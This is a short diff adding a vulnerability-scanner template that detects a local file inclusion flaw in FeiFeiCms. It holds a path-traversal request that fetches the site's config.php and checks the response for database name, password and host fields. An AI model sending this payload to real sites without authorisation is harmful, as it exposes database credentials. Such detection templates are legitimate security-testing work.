@@ -1,0 +1,24 @@
+id: feifeicms-lfr
+name: FeiFeiCms - Local File Inclusion
+severity: high
+confidence: tentative
+description: FeiFeiCms is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- feifeicms
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /index.php?s=Admin-Data-down&id=../../Conf/config.php
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: body
+    words:
+    - <?php
+    - db_name
+    - db_pwd
+    - db_host
+  condition: and
